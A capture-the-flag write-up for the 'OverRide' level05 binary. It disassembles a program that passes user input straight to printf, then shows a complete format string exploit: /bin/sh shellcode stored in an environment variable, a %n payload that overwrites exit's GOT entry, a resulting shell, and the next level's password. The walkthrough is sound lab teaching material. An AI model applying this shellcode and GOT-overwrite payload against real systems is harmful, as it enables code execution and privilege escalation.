# level05

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

```gdb
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x08048444 <+0>:      push   ebp
   0x08048445 <+1>:      mov    ebp,esp
   0x08048447 <+3>:      push   edi
   0x08048448 <+4>:      push   ebx
   0x08048449 <+5>:      and    esp,0xfffffff0
   0x0804844c <+8>:      sub    esp,0x90                            ; 144 bytes of stack space
   0x08048452 <+14>:     mov    DWORD PTR [esp+0x8c],0x0
   0x0804845d <+25>:     mov    eax,ds:0x80497f0                    ; stdin
   0x08048462 <+30>:     mov    DWORD PTR [esp+0x8],eax
   0x08048466 <+34>:     mov    DWORD PTR [esp+0x4],0x64
   0x0804846e <+42>:     lea    eax,[esp+0x28]
   0x08048472 <+46>:     mov    DWORD PTR [esp],eax
   0x08048475 <+49>:     call   0x8048350 <fgets@plt>               ; fgets(buf, 100, stdin)
   0x0804847a <+54>:     mov    DWORD PTR [esp+0x8c],0x0
   0x08048485 <+65>:     jmp    0x80484d3 <main+143>
   0x08048487 <+67>:     lea    eax,[esp+0x28]
   0x0804848b <+71>:     add    eax,DWORD PTR [esp+0x8c]
   0x08048492 <+78>:     movzx  eax,BYTE PTR [eax]
   0x08048495 <+81>:     cmp    al,0x40
   0x08048497 <+83>:     jle    0x80484cb <main+135>
   0x08048499 <+85>:     lea    eax,[esp+0x28]
   0x0804849d <+89>:     add    eax,DWORD PTR [esp+0x8c]
   0x080484a4 <+96>:     movzx  eax,BYTE PTR [eax]
   0x080484a7 <+99>:     cmp    al,0x5a
   0x080484a9 <+101>:    jg     0x80484cb <main+135>
   0x080484ab <+103>:    lea    eax,[esp+0x28]
   0x080484af <+107>:    add    eax,DWORD PTR [esp+0x8c]
   0x080484b6 <+114>:    movzx  eax,BYTE PTR [eax]
   0x080484b9 <+117>:    mov    edx,eax
   0x080484bb <+119>:    xor    edx,0x20
   0x080484be <+122>:    lea    eax,[esp+0x28]
   0x080484c2 <+126>:    add    eax,DWORD PTR [esp+0x8c]
   0x080484c9 <+133>:    mov    BYTE PTR [eax],dl
   0x080484cb <+135>:    add    DWORD PTR [esp+0x8c],0x1
   0x080484d3 <+143>:    mov    ebx,DWORD PTR [esp+0x8c]
   0x080484da <+150>:    lea    eax,[esp+0x28]
   0x080484de <+154>:    mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080484e6 <+162>:    mov    edx,eax
   0x080484e8 <+164>:    mov    eax,0x0
   0x080484ed <+169>:    mov    ecx,DWORD PTR [esp+0x1c]
   0x080484f1 <+173>:    mov    edi,edx
   0x080484f3 <+175>:    repnz scas al,BYTE PTR es:[edi]            ; strlen(buf)
   0x080484f5 <+177>:    mov    eax,ecx
   0x080484f7 <+179>:    not    eax
   0x080484f9 <+181>:    sub    eax,0x1
   0x080484fc <+184>:    cmp    ebx,eax
   0x080484fe <+186>:    jb     0x8048487 <main+67>
   0x08048500 <+188>:    lea    eax,[esp+0x28]
   0x08048504 <+192>:    mov    DWORD PTR [esp],eax
   0x08048507 <+195>:    call   0x8048340 <printf@plt>              ; printf(buf)
   0x0804850c <+200>:    mov    DWORD PTR [esp],0x0
   0x08048513 <+207>:    call   0x8048370 <exit@plt>
End of assembler dump.
```

The program is quite simple. It takes an input thansk to `fgets` and transform all capitals letters (from `'A'` to
`'Z'`) into lowercase letters. Then the buffer is dumped directly into `printf`,  which is _really_, _really_, _really_
bad.

## Exploit

Let's start to find the format string offset:

```console
level05@OverRide:~$ (python -c 'print "aaaa" + " %08x" * 20') | ./level05
aaaa 00000064 f7fcfac0 f7ec3af9 ffffd6cf ffffd6ce 00000000 ffffffff ffffd754 f7fdb000 61616161 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830level05@OverRide:~$
```

The offset is 10 (because `aaaa` corresponds to `61616161` in hexadecimal). Then, we are going to use format string
exploit to re-print the address of the last call of `exit` (`0x08048513 <+207>:    call   0x8048370 <exit@plt>`) into
the GOT.

First, let's put our shellcode into environment variables:

```console
level05@OverRide:~$ export SHELLCODE=`python -c 'print "\x90" * 50 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`
level05@OverRide:~$ env | grep SHELLCODE
SHELLCODE=��������������������������������������������������j
                                                             X�Rh//shh/bin��1�̀
```

Thanks to GDB, we find that `SHELLCODE` address is: `0xffffd884` (it may change).

We have the code we wan't to call. Now let's get the `exit` GOT address we are going to re-print:

```console
level05@OverRide:~$ objdump -R level05

level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```

The `exit` address in the GOT is `0x080497e0`. Finally, we are going to print `0xd884` (decimal `55428`) at `0x080497e0`
and `0xffff` (decimal `65535`) at `0x080497e2`:

```console
level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55450x" + "%10$n" + "%10077x" + "%11$n"'; cat) | ./level05
[...]
                                   f7fcfac0
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
